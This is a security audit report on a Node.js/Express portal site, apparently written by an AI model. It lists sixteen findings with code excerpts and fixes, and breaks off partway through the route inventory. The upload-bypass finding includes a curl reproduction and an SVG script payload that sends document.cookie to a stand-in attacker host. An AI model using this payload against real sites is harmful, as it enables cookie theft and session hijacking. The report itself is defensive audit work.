# Security Audit — HalliProjects (hallismiley.is)
**Date:** 2026-04-16  
**Auditor:** Claude Sonnet 4.6 (code review / static analysis)  
**Scope:** Full-stack Node.js/Express SPA — server, middleware, routes, controllers, models, client-side JS, Dockerfile, secrets

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Methodology](#2-methodology)
3. [Findings](#3-findings)
   - 3.1 [File Upload — MIME Type Bypass (HIGH)](#31-file-upload--mime-type-bypass-high)
   - 3.2 [Rate Limiting — Password Reset Endpoints Unprotected (MEDIUM)](#32-rate-limiting--password-reset-endpoints-unprotected-medium)
   - 3.3 [CSRF Secret — Hardcoded Development Fallback (MEDIUM)](#33-csrf-secret--hardcoded-development-fallback-medium)
   - 3.4 [Rate Limiters Disabled When NODE_ENV Unset (MEDIUM)](#34-rate-limiters-disabled-when-node_env-unset-medium)
   - 3.5 [Input Sanitizer Does Not Recurse Into Nested Objects (MEDIUM)](#35-input-sanitizer-does-not-recurse-into-nested-objects-medium)
   - 3.6 [Sanitizer Strips Rich Text From News Article Bodies (MEDIUM)](#36-sanitizer-strips-rich-text-from-news-article-bodies-medium)
   - 3.7 [SecurityLogger Not Wired Into Auth Controllers (LOW)](#37-securitylogger-not-wired-into-auth-controllers-low)
   - 3.8 [Contact Form Logs User PII (LOW)](#38-contact-form-logs-user-pii-low)
   - 3.9 [Email Service Logs Token Links and Addresses (LOW)](#39-email-service-logs-token-links-and-addresses-low)
   - 3.10 [Alert Webhook URL Logged on Delivery Failure (LOW)](#310-alert-webhook-url-logged-on-delivery-failure-low)
   - 3.11 [No CSRF Protection on POST /auth/logout (LOW)](#311-no-csrf-protection-on-post-authlogout-low)
   - 3.12 [NavBar displayName Rendered Without escHtml (INFO)](#312-navbar-displayname-rendered-without-eschtml-info)
   - 3.13 [CSP style-src Allows unsafe-inline (INFO)](#313-csp-style-src-allows-unsafe-inline-info)
   - 3.14 [Missing Cross-Origin-Resource-Policy Header (INFO)](#314-missing-cross-origin-resource-policy-header-info)
   - 3.15 [No CSP Report-URI / Report-To Directive (INFO)](#315-no-csp-report-uri--report-to-directive-info)
   - 3.16 [Incomplete Required-Env Validation at Startup (INFO)](#316-incomplete-required-env-validation-at-startup-info)
4. [Positive Observations](#4-positive-observations)
5. [Prioritized Remediation Roadmap](#5-prioritized-remediation-roadmap)
6. [Appendix A — Route Inventory](#appendix-a--route-inventory)
7. [Appendix B — Dependency Audit](#appendix-b--dependency-audit)

---

## 1. Executive Summary

### Severity Counts

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 5 |
| LOW | 5 |
| INFO | 5 |
| **Total** | **16** |

### Top 10 Risks (Ranked)

| # | Finding | Severity |
|---|---------|----------|
| 1 | SVG upload MIME type bypass enables stored XSS for all party guests | HIGH |
| 2 | No rate limit on forgot-password / reset-password → password-reset flooding | MEDIUM |
| 3 | CSRF_SECRET falls back to a known hardcoded string when env var is absent | MEDIUM |
| 4 | All rate limiters are silently disabled when NODE_ENV is not set | MEDIUM |
| 5 | Input sanitizer skips nested objects (RSVP answers, section metadata) | MEDIUM |
| 6 | Sanitizer strips all HTML tags from news article body (functional + security regression risk) | MEDIUM |
| 7 | Security events (login, lockout, signup) are never written to the structured security log | LOW |
| 8 | Contact form logs full name + email to stdout (GDPR / log-shipping concern) | LOW |
| 9 | Dev-mode email service writes full token links; production mode logs recipient addresses | LOW |
| 10 | Slack webhook URL (contains secret token) written to logs on delivery failure | LOW |

### Overall Posture

The application demonstrates strong security fundamentals: all SQL queries are parameterized, session cookies carry `httpOnly/secure/SameSite=strict`, CSRF protection is deployed on every state-changing admin endpoint, password hashing uses Scrypt, OAuth uses PKCE, mass assignment is blocked by explicit allowlists, and the previous audit's critical findings (TLS verification, committed keys, path-to-regexp ReDoS) have all been resolved. No committed secrets and zero npm audit vulnerabilities were found.

The single HIGH-severity finding is the file upload MIME validation gap, which allows a party guest to upload a disguised SVG file and achieve stored XSS. This is the only issue requiring immediate attention before the next public-facing party event. The five MEDIUM issues are actionable in one sprint. The LOW and INFO items are improvements to defence-in-depth and observability.

---

## 2. Methodology

**Approach:** Static code review with manual data-flow tracing. No live requests were made against the deployment. All findings are confirmed from source code.

**Tools / techniques:**
- Full read of every route file, controller, middleware, model, and client-side JS file
- Grep for security-relevant patterns: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, raw SQL string concatenation, `eval`, `exec`, `spawn`, `readFile`, hardcoded secrets
- Multer config traced from route → middleware → disk storage handler
- SQL parameterization confirmed in every model and controller
- npm audit (--production) run directly; output shown in Appendix B
- .gitignore, Dockerfile, and working tree examined for committed secrets

**Files examined (non-exhaustive):**

```
server/
  app.js                       routes/authRoutes.js
  server.js                    routes/projectRoutes.js
  auth/lucia.js                routes/newsRoutes.js
  auth/middleware.js           routes/partyRoutes.js
  auth/roles.js                routes/userRoutes.js
  middleware/csrf.js           routes/adminRoutes.js
  middleware/sanitize.js       routes/contactRoutes.js
  middleware/upload.js         routes/contentRoutes.js
  middleware/validate.js       routes/uploadRoutes.js
  middleware/rateLimiter.js    scripts/migrate.js
  controllers/authController.js     scripts/seed*.js
  controllers/googleAuthController.js
  controllers/projectController.js
  controllers/newsController.js
  controllers/partyController.js
  controllers/userController.js
  controllers/contactController.js
  controllers/contentController.js
  models/Project.js
  models/NewsArticle.js
  models/User.js
  config/database.js
  observability/logger.js
  observability/securityLogger.js
  observability/alerts.js
  services/emailService.js
  services/tokenCleanup.js
  utils/youtube.js

public/js/
  utils/escHtml.js
  views/ArticleView.js
  views/AdminUsersView.js
  views/PartyView.js
  views/ProfileView.js
  views/ProjectDetailView.js
  components/NavBar.js

Dockerfile, .gitignore, package.json, package-lock.json
```

**Scope limitations:** No runtime testing, no fuzzing, no network-layer review (TLS cert, DNS). Client-side JavaScript review was limited to innerHTML/XSS patterns; full SPA logic review was not in scope.

---

## 3. Findings

---

### 3.1 File Upload — MIME Type Bypass (HIGH)

**Severity:** HIGH  
**Category:** File Upload / Stored XSS  
**CWE:** CWE-434 (Unrestricted Upload of Dangerous File Type), CWE-79 (XSS)

**Location:**
- `server/middleware/upload.js` — `fileFilter` function and `filename` function
- `server/routes/partyRoutes.js` — `POST /party/photos`
- `server/routes/projectRoutes.js` — `POST /projects/:id/media`, `POST /projects/:id/videos`
- `server/controllers/contentController.js` — content image upload

**Finding:**

The `fileFilter` in `upload.js` validates `file.mimetype`, which is taken directly from the `Content-Type` field in the multipart form-data request — it is a client-supplied string, not derived from the file's actual bytes. The `filename` function generates the stored filename using `path.extname(file.originalname)`, which is also a client-controlled value.

```javascript
// server/middleware/upload.js
const fileFilter = (req, file, cb) => {
  if (ALLOWED_MIME_TYPES.includes(file.mimetype)) {  // ← Content-Type header, not magic bytes
    cb(null, true);
  } else {
    cb(new Error(`File type not allowed: ${file.mimetype}`), false);
  }
};

const filename = (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase() || '.jpg';  // ← originalname, not magic bytes
  const name = `${Date.now()}-${Math.random().toString(36).slice(2, 9)}${ext}`;
  cb(null, name);
};
```

An attacker can send a multipart request with:
- `Content-Type: image/jpeg` (passes the allowlist check)
- `filename="evil.svg"` (gives the stored file a `.svg` extension)
- Body: a valid SVG file containing `<script>` or event handlers

Because `express.static` serves files by extension and sets `Content-Type: image/svg+xml` for `.svg` files, the browser will execute the SVG as an active document.

**Impact:**

The party photo upload endpoint (`POST /party/photos`) requires only `party_access` role (not admin). Any authenticated party guest can upload a disguised SVG and have it stored. All other party guests who view `/party` will load the photo and the embedded SVG script will execute in their browser context (same origin), giving the attacker access to session cookies (non-httpOnly cookies), the CSRF token, and the ability to make authenticated requests on behalf of every viewer.

Admin/moderator-only upload endpoints (project media, content images) carry the same bypass but are lower-impact due to the higher privilege required.

**Reproduction:**

```bash
curl -X POST https://hallismiley.is/api/party/photos \
  -H "Cookie: session=<valid-party-session>" \
  -H "X-CSRF-Token: <valid-csrf-token>" \
  -F "file=@payload.svg;type=image/jpeg;filename=evil.svg"
```

Where `payload.svg` contains:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
</svg>
```

**Recommendation:**

1. **Read magic bytes** — use the `file-type` npm package (maintained, no native deps) to inspect the first bytes of the buffer before writing to disk:

```javascript
const { fileTypeFromBuffer } = require('file-type');

// In fileFilter, buffer the first 4KB then check:
const chunk = req.headers['content-length'] ? ... // stream sniff approach
// Or use a transform stream that checks the first chunk
```

2. **Reject SVG unconditionally** from user-facing upload endpoints (party photos). SVG is an XML+JS document, not a raster image. Remove `image/svg+xml` from `ALLOWED_MIME_TYPES` for party photo and any public upload contexts.

3. **Whitelist extensions independently of MIME** — validate that the extension of `file.originalname` matches the detected MIME type; reject mismatches.

4. **Serve uploaded files from a separate origin or with `Content-Disposition: attachment`** — this eliminates XSS risk from any file type bypass because the browser will download rather than render.

5. Short-term mitigation: add `X-Content-Type-Options: nosniff` on the static file route (it is already set globally via Helmet, which helps) and add `Content-Security-Policy: sandbox` header specifically on the upload serve path.

**Effort:** Medium (1–2 days to add magic-byte check and remove SVG from party allowlist)

---

### 3.2 Rate Limiting — Password Reset Endpoints Unprotected (MEDIUM)

**Severity:** MEDIUM  
**Category:** Authentication / Brute Force  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Location:** `server/routes/authRoutes.js:52–60`

**Finding:**

`POST /auth/forgot-password` and `POST /auth/reset-password` are covered only by the global limiter (400 requests per 15 minutes per IP). A dedicated rate limiter (analogous to `authLimiter` used on login) is absent.

```javascript
// authRoutes.js — no specific limiter on these routes
router.post('/forgot-password', authController.forgotPassword);
router.post('/reset-password',  authController.resetPassword);
```

Compare with login:
```javascript
router.post('/login', authLimiter, authController.login);  // 10/15min
```

**Impact:**

An attacker can submit 400 forgot-password requests per 15 minutes per IP (thousands per hour across IPs). While `forgotPassword` always returns 200 (no enumeration), the outbound email volume could trigger Resend API abuse limits, generate noise for legitimate users, and bypass intended friction in the password-reset flow. `resetPassword` could be token-guessed at volume (mitigated by 256-bit token entropy, but belt-and-suspenders is appropriate).

**Recommendation:**

Add a dedicated limiter to both endpoints:

```javascript
const resetLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 5,
  message: { error: 'Too many requests', code: 429 } });

router.post('/forgot-password', resetLimiter, authController.forgotPassword);
router.post('/reset-password',  resetLimiter, authController.resetPassword);
```

**Effort:** Small (< 1 hour)

---

### 3.3 CSRF Secret — Hardcoded Development Fallback (MEDIUM)

**Severity:** MEDIUM  
**Category:** CSRF  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Location:** `server/middleware/csrf.js:12`

**Finding:**

```javascript
getSecret: () => process.env.CSRF_SECRET ?? 'dev-csrf-secret-change-in-production',
```

If `CSRF_SECRET` is not set in the production environment, the application silently uses a known, public fallback secret. An attacker who knows this fallback (it is in the source code) can forge valid CSRF tokens.

**Impact:**

If a production deployment is misconfigured and `CSRF_SECRET` is absent, CSRF protection is completely bypassed. All state-changing admin and user endpoints (project create/update/delete, user profile, session revoke) become vulnerable to cross-site request forgery.

**Recommendation:**

1. Add `CSRF_SECRET` to `REQUIRED_ENV` in `server/server.js`:

```javascript
const REQUIRED_ENV = ['DATABASE_URL', 'ALLOWED_ORIGINS', 'CSRF_SECRET'];
```

This causes the server to refuse to start rather than silently fall back, eliminating the risk entirely.

2. Remove the fallback string from `csrf.js` entirely.

**Effort:** Small (< 30 minutes)

---

### 3.4 Rate Limiters Disabled When NODE_ENV Unset (MEDIUM)

**Severity:** MEDIUM  
**Category:** Rate Limiting / Configuration  
**CWE:** CWE-16 (Configuration)

**Location:** `server/app.js:122` (skip condition in rate limiter factory)

**Finding:**

```javascript
skip: () =>
  process.env.NODE_ENV === 'test' ||
  process.env.NODE_ENV === 'development' ||
  !process.env.NODE_ENV,   // ← silently disables all rate limits
```

If `NODE_ENV` is not set in a production deployment, every rate limiter (`authLimiter`, `signupLimiter`, `checkLimiter`, `resendLimiter`, `globalLimiter`) is silently skipped. There is no warning or startup failure.

**Impact:**

A production deployment with a missing `NODE_ENV` (common in misconfigured containers or when `.env` is not loaded) has no brute-force protection on login, signup, or any other rate-limited endpoint.

**Recommendation:**

Remove `!process.env.NODE_ENV` from the skip condition. Rate limiting should be active unless explicitly disabled:

```javascript
skip: () =>
  process.env.NODE_ENV === 'test' ||
  process.env.NODE_ENV === 'development',
```

Add `NODE_ENV` to `REQUIRED_ENV` in `server.js` or at minimum log a warning at startup when `NODE_ENV` is absent.

**Effort:** Small (< 30 minutes)

---

### 3.5 Input Sanitizer Does Not Recurse Into Nested Objects (MEDIUM)

**Severity:** MEDIUM  
**Category:** Input Validation / Defence in Depth  
**CWE:** CWE-20 (Improper Input Validation)

**Location:** `server/middleware/sanitize.js` — `sanitizeObject()`

**Finding:**

```javascript
function sanitizeObject(obj) {
  for (const [key, val] of Object.entries(obj)) {
    if (Array.isArray(val)) {
      clean[key] = val.map(v => (typeof v === 'string' ? sanitizeString(v) : v));
    } else if (typeof val === 'string') {
      clean[key] = sanitizeString(val);
    } else {
      clean[key] = val;  // ← nested objects passed through unsanitized
    }
  }
}
```

Nested objects (e.g., `req.body.answers` for party RSVPs, section `metadata`, any future JSON payload) bypass the sanitizer entirely.

**Impact:**

String values inside nested objects could contain HTML or script content that is stored verbatim and later rendered. The risk is mitigated by parameterized queries (no SQL injection), client-side `escHtml` usage, and server-side template escaping, but the defence-in-depth layer is incomplete.

**Recommendation:**

Make `sanitizeObject` recurse:

```javascript
function sanitizeObject(obj) {
  const clean = {};
  for (const [key, val] of Object.entries(obj)) {
    if (Array.isArray(val)) {
      clean[key] = val.map(v =>
        typeof v === 'string' ? sanitizeString(v) :
        (v && typeof v === 'object') ? sanitizeObject(v) : v
      );
    } else if (typeof val === 'string') {
      clean[key] = sanitizeString(val);
    } else if (val && typeof val === 'object') {
      clean[key] = sanitizeObject(val);  // ← recurse
    } else {
      clean[key] = val;
    }
  }
  return clean;
}
```

**Effort:** Small (1 hour including tests)

---

### 3.6 Sanitizer Strips Rich Text From News Article Bodies (MEDIUM)

**Severity:** MEDIUM (functional regression + security regression risk)  
**Category:** Input Validation  

**Location:** `server/middleware/sanitize.js`, `server/routes/newsRoutes.js`

**Finding:**

The sanitize middleware strips all HTML tags from request body strings (it is designed for plain-text inputs). News article bodies are rich HTML produced by the editor. Running them through the current sanitizer removes all markup and stores the article as plain text.

The correct sanitization for rich-text HTML is an allowlist-based HTML sanitizer (such as DOMPurify server-side, or a purpose-built allow list). The current sanitizer is the wrong tool for this input type.

**Impact:**

1. All news articles lose their formatting on save (functional breakage).
2. If the sanitizer is removed to fix (1), rich HTML is stored unfiltered — the client-side `sanitizeBody()` in `ArticleView.js` is the only XSS barrier for article bodies, and it only runs on display, not on storage.

**Recommendation:**

1. Exclude the `body` field from the plain-text sanitizer for news article routes (use a field-level exclusion in the validate middleware or a separate body-only validation step).
2. Add server-side HTML allowlist sanitization for the `body` field using a library such as `sanitize-html` or `isomorphic-dompurify` with a strict allowlist matching the client-side `ALLOWED_TAGS` in `ArticleView.js`.
3. This provides defence-in-depth: malicious markup is rejected at the API boundary rather than relying solely on display-time sanitization.

**Effort:** Medium (half-day: add sanitize-html, configure allowlist, write tests)

---

### 3.7 SecurityLogger Not Wired Into Auth Controllers (LOW)

**Severity:** LOW  
**Category:** Logging / Observability  
**CWE:** CWE-778 (Insufficient Logging)

**Location:** `server/observability/securityLogger.js`, `server/controllers/authController.js`, `server/controllers/googleAuthController.js`

**Finding:**

`securityLogger.js` exports `loginFailed()`, `loginSuccess()`, `accountLocked()`, `rateLimitHit()`, `csrfFailure()`, `signupAttempt()`, `adminAction()`, `disabledAccountAccess()`. However, `securityLogger` is only imported in `alerts.js`. Auth controllers use `logger.info()` / `logger.warn()` for generic pino output rather than the structured security event functions.

```javascript
// grep result: securityLogger imported only in:
//   server/observability/alerts.js
// NOT in: authController.js, googleAuthController.js, partyController.js
```

**Impact:**

Security-relevant events (login failures, lockouts, signups, admin actions) are logged only as generic pino messages without the structured fields that `securityLogger` would add. Downstream SIEM integrations, alerting rules, and incident response rely on consistent event structure. Lockout events and repeated login failures are not surfaced as security alerts.

**Recommendation:**

Wire `securityLogger` into auth controllers:

```javascript
// authController.js
const securityLogger = require('../observability/securityLogger');

// In login():
securityLogger.loginFailed(username, ip, 'invalid_password');
securityLogger.loginSuccess(user.id, ip);
securityLogger.accountLocked(user.id, ip);

// In signup():
securityLogger.signupAttempt(email, ip);
```

**Effort:** Small (2–3 hours)

---

### 3.8 Contact Form Logs User PII (LOW)

**Severity:** LOW  
**Category:** Data Privacy / Logging  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Location:** `server/controllers/contactController.js:41–44`

**Finding:**

```javascript
console.log(`[Contact] New submission:`);
console.log(`  Name: ${name.trim()}`);
console.log(`  Email: ${email.trim()}`);
console.log(`  Message: ${message.trim()}`);
```

The full contact form submission (name, email, message body) is written to stdout. In production, stdout is typically shipped to a log aggregator (Pino, Railway logs, Azure Monitor). User PII and message content are retained in the log store indefinitely.

**Impact:**

GDPR Article 5 requires data minimisation. Logging contact form submissions to an aggregated log store creates a secondary record of user PII beyond the intended processing purpose (sending the notification email).

**Recommendation:**

Remove or reduce the log content. At minimum, log only a non-identifying correlation ID:

```javascript
logger.info({ submissionId: crypto.randomUUID() }, '[Contact] Form submission received');
```

If debugging requires more detail, log at `debug` level (not shipped to prod aggregators) and strip the message body.

**Effort:** Small (< 30 minutes)

---

### 3.9 Email Service Logs Token Links and Addresses (LOW)

**Severity:** LOW  
**Category:** Secrets / Logging  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Location:** `server/services/emailService.js:68–70`, `server/services/emailService.js:97`, `server/services/emailService.js:110–111`

**Finding:**

In development mode (no `RESEND_API_KEY`):
```javascript
console.log(`[EmailService] Resend not configured — verification link for ${to}:`);
console.log(`  ${link}`);  // ← full token in URL logged to stdout
```

In production:
```javascript
console.log(`[EmailService] Sending verification email to ${to}`);  // ← email address logged
```

Password-reset tokens embedded in links are equivalent to temporary credentials. Email addresses are PII. Both appear in logs.

**Impact:**

In dev mode: token links logged to stdout allow anyone with log access to bypass email verification or reset any account. In production: email addresses written to console (not structured pino with redaction) bypass the pino redaction rules and land in the log aggregator.

**Recommendation:**

1. Dev mode: log only that a link was generated, not the link itself. Alternatively, use the structured `logger` with a `debug` level that is not shipped.
2. Production: remove or hash the email address before logging, or switch from `console.log` to `logger.info({ emailSent: true })`.

**Effort:** Small (< 1 hour)

---

### 3.10 Alert Webhook URL Logged on Delivery Failure (LOW)

**Severity:** LOW  
**Category:** Secrets / Logging  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Location:** `server/observability/alerts.js:59`

**Finding:**

```javascript
securityLogger.alert('warning', 'Alert webhook delivery failed', { webhookUrl });
```

Slack incoming webhook URLs are secrets — they contain an embedded token. Logging the full `webhookUrl` on failure means the Slack token appears in the log aggregator whenever the webhook is unreachable.

**Impact:**

Anyone with read access to the log store can extract the Slack webhook URL and post arbitrary messages to the Slack channel.

**Recommendation:**

Log only a masked version of the URL:

```javascript
const maskedUrl = webhookUrl.replace(/\/T[^/]+\/[^/]+\/[^/]+$/, '/T***/***/***/***');
securityLogger.alert('warning', 'Alert webhook delivery failed', { webhookUrl: maskedUrl });
```

Or log the destination channel name (if known) rather than the URL.

**Effort:** Small (< 30 minutes)

---

### 3.11 No CSRF Protection on POST /auth/logout (LOW)

**Severity:** LOW  
**Category:** CSRF  
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Location:** `server/routes/authRoutes.js`

**Finding:**

```javascript
router.post('/logout', authController.logout);  // no csrfProtect
```

All other state-changing endpoints use `csrfProtect`. Logout is missing it.

**Impact:**

An attacker can force a victim to log out via a cross-site request (CSRF logout). This is generally considered low severity — it causes a denial of convenience (user must re-authenticate) but does not give the attacker access to the victim's account. However, logout CSRF can be used as part of a session-fixation chain in some flows, and is a deviation from the consistent CSRF posture of the rest of the API.

**Recommendation:**

Add `csrfProtect` to the logout route for consistency:

```javascript
router.post('/logout', csrfProtect, authController.logout);
```

Verify that the client sends the CSRF token with logout requests (the client-side logout handler should already include it).

**Effort:** Small (< 30 minutes, but requires verifying client sends the token)

---

### 3.12 NavBar displayName Rendered Without escHtml (INFO)

**Severity:** INFO  
**Category:** XSS / Defence in Depth  

**Location:** `public/js/components/NavBar.js:76–79`

**Finding:**

```javascript
userBtn.innerHTML = `... ${user?.displayName || user?.username} ...`;
```

`displayName` is interpolated into `innerHTML` without `escHtml()`. `username` is constrained to `[a-zA-Z0-9_]` by validation (safe), but `displayName` relies on the server-side sanitize middleware being correct.

**Impact:**

Currently mitigated by server-side sanitization. However, if the sanitizer is changed or bypassed, a stored XSS payload in `displayName` would execute in every page view. Applying `escHtml()` here costs nothing.

**Recommendation:**

```javascript
import { escHtml } from '../utils/escHtml.js';
userBtn.innerHTML = `... ${escHtml(user?.displayName || user?.username)} ...`;
```

**Effort:** Trivial (< 15 minutes)

---

### 3.13 CSP style-src Allows unsafe-inline (INFO)

**Severity:** INFO  
**Category:** Content Security Policy  

**Location:** `server/app.js` — Helmet CSP configuration

**Finding:**

```javascript
styleSrc: ["'self'", "'unsafe-inline'", 'fonts.googleapis.com'],
```

`'unsafe-inline'` for `style-src` allows injected `style` attributes and `<style>` blocks. While CSS injection is lower severity than script injection, it enables UI-redressing attacks (CSS-based clickjacking, hiding/moving elements) and exfiltration via `url()` requests.

**Impact:**

CSS injection can be used to overlay deceptive UI elements. Combined with a stored XSS in a lower-privilege context, it could be used for phishing within the app.

**Recommendation:**

Move to CSS hashes or nonces (same approach as `script-src`). This requires server-side nonce injection into `<link>` and `<style>` elements, which is an architectural change. As a near-term step, audit whether any `style` attributes in HTML templates can be moved to CSS classes, then remove `'unsafe-inline'` once no inline styles remain.

**Effort:** Large (significant refactor; lower priority than other findings)

---

### 3.14 Missing Cross-Origin-Resource-Policy Header (INFO)

**Severity:** INFO  
**Category:** Security Headers  

**Location:** `server/app.js` — Helmet configuration

**Finding:**

No `Cross-Origin-Resource-Policy` (CORP) header is set. Helmet 8.x does not add CORP by default. Without CORP, cross-origin sites can embed uploaded images (including any that bypass MIME checks) in their own pages.

**Recommendation:**

Add `crossOriginResourcePolicy: { policy: 'same-site' }` to the Helmet configuration. This prevents other origins from loading uploaded media cross-origin.

**Effort:** Trivial (< 15 minutes, one config line)

---

### 3.15 No CSP Report-URI / Report-To Directive (INFO)

**Severity:** INFO  
**Category:** Security Headers / Monitoring  

**Location:** `server/app.js` — Helmet CSP configuration

**Finding:**

The CSP has no `reportUri` or `reportTo` directive. CSP violations (which would indicate a successful injection attempt or a policy misconfiguration) are silently dropped by the browser.

**Recommendation:**

Configure a CSP reporting endpoint. Free services (Report URI, Sentry) accept violation reports. Alternatively, add a simple Express route that logs CSP violation reports:

```javascript
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  logger.warn({ cspViolation: req.body }, 'CSP violation reported');
  res.sendStatus(204);
});
```

Then add to the Helmet CSP: `reportUri: '/csp-report'`.

**Effort:** Small (2–3 hours including testing)

---

### 3.16 Incomplete Required-Env Validation at Startup (INFO)

**Severity:** INFO  
**Category:** Configuration  

**Location:** `server/server.js:10`

**Finding:**

```javascript
const REQUIRED_ENV = ['DATABASE_URL', 'ALLOWED_ORIGINS'];
```

Several additional environment variables are load-bearing for security:
- `CSRF_SECRET` — falls back to hardcoded value (see Finding 3.3)
- `NODE_ENV` — determines whether rate limiters are active (see Finding 3.4)
- `SESSION_SECRET` (if used) — session integrity

Missing variables that have insecure fallbacks should cause a startup failure rather than silent degradation.

**Recommendation:**

Expand `REQUIRED_ENV`:

```javascript
const REQUIRED_ENV = ['DATABASE_URL', 'ALLOWED_ORIGINS', 'CSRF_SECRET', 'NODE_ENV'];
```

**Effort:** Trivial (< 15 minutes)

---

## 4. Positive Observations

The following security controls were confirmed present and correctly implemented. These represent meaningful improvements over previous audit states and reflect deliberate security investment.

### Authentication
- **Lucia v3 sessions** — `httpOnly: true`, `secure: true` (production), `sameSite: 'strict'` on session cookie ✓
- **Scrypt password hashing** — using oslo's Scrypt with appropriate work factor ✓
- **Timing-safe login** — hash work is performed even for non-existent users, preventing user enumeration via timing ✓
- **Account lockout** — 5 failed attempts → 15-minute lockout, tracked in DB ✓
- **Single-use password reset tokens** — token set to NULL after use, all sessions invalidated on password change ✓
- **Reset token entropy** — `crypto.randomBytes(32).toString('hex')` = 256 bits of entropy ✓
- **No email enumeration** — `forgot-password` always returns 200 regardless of whether email exists ✓
- **Google OAuth with PKCE** — code_verifier/code_challenge, state in httpOnly cookie, validated in callback ✓

### Authorization
- **Role-based access control** — explicit `requireRole('admin', 'moderator')` on all write endpoints ✓
- **Session IDOR prevention** — `WHERE id = $1 AND user_id = $2` on session revocation ✓
- **Mass assignment prevention** — Project.create/update and userController.updateMe use explicit field allowlists ✓

### SQL Injection
- **All queries parameterized** — every model and controller reviewed; no string concatenation into SQL ✓
- **0 npm audit vulnerabilities** — path-to-regexp ReDoS from March 30 audit resolved ✓

### CSRF
- **csrf-csrf double-submit pattern** — applied to all state-changing admin and user endpoints ✓
- **SameSite=strict on session cookie** — provides defence-in-depth against CSRF ✓

### Client-side XSS
- **escHtml utility** — properly implemented and imported in AdminUsersView, PartyView, ProfileView, ProjectDetailView ✓
- **DOMParser allowlist sanitizer** — ArticleView uses a strict ALLOWED_TAGS allowlist with `javascript:` href rejection and forced `rel="noopener noreferrer"` ✓

### Headers (via Helmet 8.x)
- `Content-Security-Policy` — `script-src` does not include `'unsafe-inline'` ✓
- `X-Frame-Options: DENY` ✓
- `X-Content-Type-Options: nosniff` ✓
- `Referrer-Policy: strict-origin-when-cross-origin` ✓
- `Strict-Transport-Security` (HSTS) — enabled in production ✓

### Secrets and Committed Files
- `keys/`, `ClaudeHalliProjectskeys/`, `.env`, `*.pem` — all properly excluded in `.gitignore` ✓
- `Dockerfile` does not `COPY keys/` ✓
- No keys or PEM files found in working tree ✓
- Previous audit finding (TLS `rejectUnauthorized: false`) resolved: `database.js` now has `rejectUnauthorized: true` ✓

### Infrastructure
- Docker runs as non-root user (`appuser`) ✓
- Multi-stage build (dev dependencies excluded from image) ✓
- Pino structured logging with redaction of `password`, `password_hash`, `token`, `secret`, `authorization`, `cookie` ✓
- `startTokenCleanup()` runs every 24h to expire sessions ✓

---

## 5. Prioritized Remediation Roadmap

### This Week (Before Next Party Event)

| # | Finding | Effort | Owner |
|---|---------|--------|-------|
| 1 | **Remove `image/svg+xml` from party photo MIME allowlist** | S | Backend |
| 2 | Add magic-byte validation (file-type package) to upload middleware | M | Backend |
| 3 | Add `CSRF_SECRET` to `REQUIRED_ENV` + remove hardcoded fallback | S | Backend |
| 4 | Remove `!process.env.NODE_ENV` from rate limiter skip condition | S | Backend |
| 5 | Add dedicated rate limiter to `/auth/forgot-password` and `/auth/reset-password` | S | Backend |

### This Month (Next Sprint)

| # | Finding | Effort | Owner |
|---|---------|--------|-------|
| 6 | Make `sanitizeObject` recurse into nested objects | S | Backend |
| 7 | Exclude article `body` from plain-text sanitizer; add server-side HTML allowlist for rich text | M | Backend |
| 8 | Wire `securityLogger` into auth controllers | S | Backend |
| 9 | Remove PII from contact form logs | S | Backend |
| 10 | Fix email service logging (remove token links + address from logs) | S | Backend |
| 11 | Mask Slack webhook URL in alert failure logs | S | Backend |
| 12 | Add `escHtml()` to NavBar displayName interpolation | S | Frontend |
| 13 | Add `crossOriginResourcePolicy: { policy: 'same-site' }` to Helmet | S | Backend |
| 14 | Add `NODE_ENV` and `CSRF_SECRET` to `REQUIRED_ENV` | S | Backend |

### Backlog (Next Quarter)

| # | Finding | Effort | Owner |
|---|---------|--------|-------|
| 15 | Add `/csp-report` endpoint and CSP `reportUri` directive | S | Backend |
| 16 | Add CSRF protection to `POST /auth/logout` | S | Backend |
| 17 | Eliminate `'unsafe-inline'` from CSP `style-src` | L | Frontend |
| 18 | Serve uploaded files from separate subdomain or with `Content-Disposition: attachment` | L | Infra |

---

## Appendix A — Route Inventory

All routes enumerated from route files. Auth = session required; Role = minimum role required.

### Auth Routes (`/api/auth`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| POST | /auth/signup | No | — | email, username, password | signupLimiter (15/10min) |
| POST | /auth/login | No | — | email/username, password | authLimiter (10/15min) |
| POST | /auth/logout | Yes | any | — | globalLimiter only |
| GET | /auth/verify-email | No | — | token query param | globalLimiter only |
| POST | /auth/resend-verification | No | — | email | resendLimiter (1/min) |
| POST | /auth/forgot-password | No | — | email | globalLimiter only ⚠️ |
| POST | /auth/reset-password | No | — | token, newPassword | globalLimiter only ⚠️ |
| GET | /auth/check-username | No | — | username query param | checkLimiter (30/hr) |
| GET | /auth/check-email | No | — | email query param | checkLimiter (30/hr) |
| GET | /auth/google | No | — | — | authLimiter (10/15min) |
| GET | /auth/google/callback | No | — | state, code | authLimiter (10/15min) |
| GET | /auth/csrf-token | No | — | — | globalLimiter only |
| GET | /auth/session | No | — | — | globalLimiter only |

### User Routes (`/api/users`)

| Method | Path | Auth | Role | Validation | Rate Limited |
|--------|------|------|------|------------|--------------|
| GET | /users/me | Yes | any | — | globalLimiter |
| PATCH | /users/me | Yes | any | display_name, phone, avatar | globalLimiter |
| PATCH | /users/me/password | Yes | any | currentPassword, newPassword | globalLimiter |
| GET | /users/me/sessions | Yes | any | — | globalLimiter |
| DELETE | /users/me/sessions | Yes | any | — | globalLimiter |
| DELETE | /users/me/sessions/:sessionId | Yes | any | — | globalLimiter |

### Project Routes (`/api/projects`)

| Method | Path | Auth | Role | Validation | Rate Limited |
